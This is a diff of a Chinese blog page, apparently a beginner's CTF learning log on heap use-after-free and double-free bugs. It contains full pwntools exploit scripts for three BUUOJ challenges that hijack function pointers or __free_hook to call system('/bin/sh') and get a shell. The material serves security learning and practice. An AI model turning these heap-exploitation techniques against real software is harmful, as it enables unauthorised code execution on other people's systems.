@@ -1,37 +1,52 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
 
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
   <link rel="icon" type="image/png" href="/img/favicon.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>uaf和double free ~ Chumen77&#39;s Blog</title>
+  <title>uaf和double free - Chumen77&#39;s Blog</title>
 
-  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
-<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
-<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/apache-config.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 <link rel="stylesheet" href="/css/main.css">
 
+<!-- 自定义样式保持在最底部 -->
 
-  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
 
-
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
 </head>
 
 
@@ -56,40 +71,60 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
-          
-          
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
@@ -97,51 +132,53 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" false
-         style="background: url('/img/default.png')no-repeat center center;
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
             <span class="h2" id="subtitle">
               
             </span>
 
             
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期六, 四月 25日 2020, 11:40 中午
-                </p>
-              
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-04-25 11:40" pubdate>
+        2020年4月25日 中午
+      </time>
+    </span>
+  
+</div>
 
-              <p>
-                
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    1.2k 字
-                  </span>&nbsp;
-                
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      991 字
+    </span>
+  
 
-                
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      6 分钟
-                  </span>&nbsp;
-                
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      17
+       分钟
+    </span>
+  
 
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
+  
+  
+</div>
+
             
           </div>
 
@@ -159,261 +196,285 @@
   <div class="row">
     <div class="d-none d-lg-block col-lg-2"></div>
     <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
-            <h1 id="uaf和double-free"><a href="#uaf和double-free" class="headerlink" title="uaf和double free"></a>uaf和double free</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始打算入门堆，简单记录几道相关的题。</p>
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">uaf和double free</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="uaf和double-free"><a href="#uaf和double-free" class="headerlink" title="uaf和double free"></a>uaf和double free</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始打算入门堆，简单记录几道相关的题。</p>
 <h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>题目较为简单存在后门函数，利用uaf漏洞攻击即可。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
-local_file  = &#39;./hacknote&#39;
-local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
-remote_libc = local_libc # &#39;../libc.so.6&#39;
-debug = 0
-if debug:
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+local_file  = <span class="hljs-string">'./hacknote'</span>
+local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>
+debug = <span class="hljs-number">0</span>
+<span class="hljs-keyword">if</span> debug:
     io = process(local_file)
     libc = ELF(local_libc)
-else:
-    io = remote(&#39;node3.buuoj.cn&#39;,27892)
+<span class="hljs-keyword">else</span>:
+    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27892</span>)
     libc = ELF(remote_libc)
 
 elf = ELF(local_file)
 libc = elf.libc
-context.log_level = &#39;debug&#39;
+context.log_level = <span class="hljs-string">'debug'</span>
 context.arch = elf.arch
-context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;
+context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>
 
-s      = lambda data               :io.send(data) 
-sa      = lambda delim,data         :io.sendafter(delim, data)
-sl      = lambda data               :io.sendline(data)
-sla     = lambda delim,data         :io.sendlineafter(delim, data)
-sea     = lambda delim,data         :io.sendafter(delim, data)
-r      = lambda numb=4096          :io.recv(numb)
-ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
-uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
-uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
-info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))
-itr     = lambda                    :io.interactive()
-def dbg():
-    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)
-    gdb.attach(io)
-    pause()
-
-def add(size,content):
-    sl(&#39;1&#39;)
-    ru(&#39;Note size &#39;)
+s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
+info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>
+	<span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>
+	gdb.attach(io)
+	pause()
+	
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>
+    sl(<span class="hljs-string">'1'</span>)
+    ru(<span class="hljs-string">'Note size '</span>)
     sl(str(size))
-    ru(&#39;Content :&#39;)
+    ru(<span class="hljs-string">'Content :'</span>)
     sl(str(content))
 
-def dele(index):
-    sl(&#39;2&#39;)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>
+    sl(<span class="hljs-string">'2'</span>)
     sl(str(index))
-def show(index):
-    sl(&#39;3&#39;)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>
+    sl(<span class="hljs-string">'3'</span>)
     sl(str(index))
-ru(&#39;Your choice :&#39;)
-add(16,&#39;aaaa&#39;)
-ru(&#39;Your choice :&#39;)
-add(16,&#39;bbbb&#39;)
-ru(&#39;Your choice :&#39;)
-dele(0)
-ru(&#39;Your choice :&#39;)
-dele(1)
-ru(&#39;Your choice :&#39;)
-add(8,p32(elf.symbols[&#39;magic&#39;]))
-ru(&#39;Your choice :&#39;)
-show(0)
-itr()</code></pre>
+ru(<span class="hljs-string">'Your choice :'</span>)
+add(<span class="hljs-number">16</span>,<span class="hljs-string">'aaaa'</span>)
+ru(<span class="hljs-string">'Your choice :'</span>)
+add(<span class="hljs-number">16</span>,<span class="hljs-string">'bbbb'</span>)
+ru(<span class="hljs-string">'Your choice :'</span>)
+dele(<span class="hljs-number">0</span>)
+ru(<span class="hljs-string">'Your choice :'</span>)
+dele(<span class="hljs-number">1</span>)
+ru(<span class="hljs-string">'Your choice :'</span>)
+add(<span class="hljs-number">8</span>,p32(elf.symbols[<span class="hljs-string">'magic'</span>]))
+ru(<span class="hljs-string">'Your choice :'</span>)
+show(<span class="hljs-number">0</span>)
+itr()</code></pre></div>
+
 <h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>题目有system函数，并且也有<code>/bin/sh\x00</code> ，当时在构造这个<code>/bin/sh\x00</code>的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。</p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
-local_file  = &#39;./ACTF_2019_babyheap&#39;
-local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
-remote_libc = local_libc # &#39;../libc.so.6&#39;
-debug = 1 
-if debug:
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+local_file  = <span class="hljs-string">'./ACTF_2019_babyheap'</span>
+local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>
+debug = <span class="hljs-number">1</span> 
+<span class="hljs-keyword">if</span> debug:
     io = process(local_file)
     libc = ELF(local_libc)
-else:
-    io = remote(&#39;node3.buuoj.cn&#39;,27341)
+<span class="hljs-keyword">else</span>:
+    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27341</span>)
     libc = ELF(remote_libc)
 
 elf = ELF(local_file)
 libc = elf.libc
-context.log_level = &#39;debug&#39;
+context.log_level = <span class="hljs-string">'debug'</span>
 context.arch = elf.arch
-context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;
+context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>
 
-s      = lambda data               :io.send(data) 
-sa      = lambda delim,data         :io.sendafter(delim, data)
-sl      = lambda data               :io.sendline(data)
-sla     = lambda delim,data         :io.sendlineafter(delim, data)
-sea     = lambda delim,data         :io.sendafter(delim, data)
-r      = lambda numb=4096          :io.recv(numb)
-ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
-uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
-uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
-info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))
-itr     = lambda                    :io.interactive()
-def dbg():
-    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)
-    gdb.attach(io)
-    pause()
+s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
+info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>
+	<span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>
+	gdb.attach(io)
+	pause()
+	
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>
+    sla(<span class="hljs-string">'Your choice: '</span>,<span class="hljs-string">'1'</span>)
+    sla(<span class="hljs-string">'size: \n'</span>,str(size))
+    sa(<span class="hljs-string">'content: \n'</span>,str(content)) 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>
+    sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'2'</span>)
+    sla(<span class="hljs-string">'index: \n'</span>,str(index))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>
+	sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'3'</span>)
+	sla(<span class="hljs-string">'index: \n'</span>,str(index))
 
-def add(size,content):
-    sla(&#39;Your choice: &#39;,&#39;1&#39;)
-    sla(&#39;size: \n&#39;,str(size))
-    sa(&#39;content: \n&#39;,str(content)) 
-def dele(index):
-    sla(&#39;: &#39;,&#39;2&#39;)
-    sla(&#39;index: \n&#39;,str(index))
-def show(index):
-    sla(&#39;: &#39;,&#39;3&#39;)
-    sla(&#39;index: \n&#39;,str(index))
+add(<span class="hljs-number">32</span>,<span class="hljs-string">'aaaaaaaa'</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">32</span>,<span class="hljs-string">'bbbbbbbb'</span>) <span class="hljs-comment">#1</span>
+dele(<span class="hljs-number">0</span>)
+dele(<span class="hljs-number">1</span>)
+binsh = <span class="hljs-number">0x602010</span>
+add(<span class="hljs-number">16</span>,flat(binsh,elf.plt[<span class="hljs-string">'system'</span>]))
+<span class="hljs-comment"># dbg()</span>
+show(<span class="hljs-number">0</span>)
+itr()</code></pre></div>
 
-add(32,&#39;aaaaaaaa&#39;) #0
-add(32,&#39;bbbbbbbb&#39;) #1
-dele(0)
-dele(1)
-binsh = 0x602010
-add(16,flat(binsh,elf.plt[&#39;system&#39;]))
-# dbg()
-show(0)
-itr()
-</code></pre>
 <h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。<br>改<code>__free_hook</code>为system即可。<code>__free_hook</code>的参数正好是堆块的date，较好控制。<br>（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。）</p>
-<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
-local_file  = &#39;./ACTF_2019_message&#39;
-# local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;
-# remote_libc = local_libc # &#39;../libc.so.6&#39;
-debug = 1
-if debug:
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+local_file  = <span class="hljs-string">'./ACTF_2019_message'</span>
+<span class="hljs-comment"># local_libc  = '/lib/x86_64-linux-gnu/libc-2.27.so'</span>
+<span class="hljs-comment"># remote_libc = local_libc # '../libc.so.6'</span>
+debug = <span class="hljs-number">1</span>
+<span class="hljs-keyword">if</span> debug:
     io = process(local_file)
-    # libc = ELF(local_libc)
-else:
-    io = remote(&#39;node3.buuoj.cn&#39;,25390)
-    # libc = ELF(remote_libc)
+    <span class="hljs-comment"># libc = ELF(local_libc)</span>
+<span class="hljs-keyword">else</span>:
+    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25390</span>)
+    <span class="hljs-comment"># libc = ELF(remote_libc)</span>
 
 elf = ELF(local_file)
 libc = elf.libc
-context.log_level = &#39;debug&#39;
+context.log_level = <span class="hljs-string">'debug'</span>
 context.arch = elf.arch
-context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;
+context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>
 
-s      = lambda data               :io.send(data) 
-sa      = lambda delim,data         :io.sendafter(delim, data)
-sl      = lambda data               :io.sendline(data)
-sla     = lambda delim,data         :io.sendlineafter(delim, data)
-sea     = lambda delim,data         :io.sendafter(delim, data)
-r      = lambda numb=4096          :io.recv(numb)
-ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
-uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
-uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
-info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))
-itr     = lambda                    :io.interactive()
-def dbg():
-    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)
-    gdb.attach(io)
-    pause()
+s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
+info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>
+	<span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>
+	gdb.attach(io)
+	pause()
 
-def add(length,contend) :
-    sla(&#39;choice: &#39;,&#39;1&#39;)
-    sla(&#39;length of message:\n&#39;,str(length))
-    sa(&#39;message:\n&#39;,str(contend))
-def free(index):
-    sla(&#39;choice: &#39;,&#39;2&#39;)
-    sla(&#39;to delete:\n&#39;,str(index))
-def edit(index,contend):
-    sla(&#39;choice: &#39;,&#39;3&#39;)
-    sla(&#39;to edit:\n&#39;,str(index))
-    sa(&#39;the message:\n&#39;,str(contend))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length,contend)</span> :</span>
+    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'1'</span>)
+    sla(<span class="hljs-string">'length of message:\n'</span>,str(length))
+    sa(<span class="hljs-string">'message:\n'</span>,str(contend))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span>
+    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'2'</span>)
+    sla(<span class="hljs-string">'to delete:\n'</span>,str(index))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,contend)</span>:</span>
+    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'3'</span>)
+    sla(<span class="hljs-string">'to edit:\n'</span>,str(index))
+    sa(<span class="hljs-string">'the message:\n'</span>,str(contend))
 
-def show(index):
-    sla(&#39;choice: &#39;,&#39;4&#39;)
-    sla(&#39;to display:\n&#39;,str(index))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>
+    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'4'</span>)
+    sla(<span class="hljs-string">'to display:\n'</span>,str(index))
 
 
-add(0x30,&#39;a&#39;) #0
-add(0x20,&#39;a&#39;) #1
-add(0x20,&#39;a&#39;) #2
-free(1)
-free(2)
-free(1)
+add(<span class="hljs-number">0x30</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#1</span>
+add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#2</span>
+free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">2</span>)
+free(<span class="hljs-number">1</span>)
 
-add(0x20,p64(0x602068))
-add(0x20,&#39;aaaaaaaa&#39;)
-add(0x20,&#39;aaaaaaaa&#39;)
-contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;])
-add(0x20,contend)
-show(0)
-ru(&#39; message: &#39;)
-puts = uu64(r(6))
-libc_base = puts - libc.symbols[&#39;puts&#39;]
-free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]
-print(&#39;puts&#39; + hex(puts))
-print(&#39;libc_base&#39; + hex(libc_base))
-system = libc_base + libc.symbols[&#39;system&#39;]
+add(<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x602068</span>))
+add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)
+add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)
+contend = p64(elf.got[<span class="hljs-string">'puts'</span>])<span class="hljs-comment"># + p64(0x30) + p64(elf.got['puts'])</span>
+add(<span class="hljs-number">0x20</span>,contend)
+show(<span class="hljs-number">0</span>)
+ru(<span class="hljs-string">' message: '</span>)
+puts = uu64(r(<span class="hljs-number">6</span>))
+libc_base = puts - libc.symbols[<span class="hljs-string">'puts'</span>]
+free_hook = libc_base + libc.symbols[<span class="hljs-string">'__free_hook'</span>]
+print(<span class="hljs-string">'puts'</span> + hex(puts))
+print(<span class="hljs-string">'libc_base'</span> + hex(libc_base))
+system = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]
 contend = p64(free_hook)
 dbg()
-edit(6,contend)
-# dbg()
+edit(<span class="hljs-number">6</span>,contend)
+<span class="hljs-comment"># dbg()</span>
 contend = p64(system)
-edit(0,contend)
-# dbg()
-add(0x8,&#39;/bin/sh\x00&#39;)
-free(7)
-itr()</code></pre>
-
+edit(<span class="hljs-number">0</span>,contend)
+<span class="hljs-comment"># dbg()</span>
+add(<span class="hljs-number">0x8</span>,<span class="hljs-string">'/bin/sh\x00'</span>)
+free(<span class="hljs-number">7</span>)
+itr()</code></pre></div>
+            </div>
             <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
+            <div>
+              <div class="post-metas mb-3">
                 
-                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                 
-                  <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">学习记录</a>
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/学习记录/">学习记录</a>
+                    
+                  </div>
                 
-              </span>
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/25/DASCTF安恒月赛/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DASCTF安恒月赛(4th)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/04/20/pwntools的gdb.attach/">
+                        <span class="hidden-mobile">pwntools的gdb.attach</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
             
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
+          </article>
         </div>
       </div>
     </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-    <div id="tocbot"></div>
-  </div>
-
-    </div>
-  </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<!-- custom -->
-
-
-<!-- Comments -->
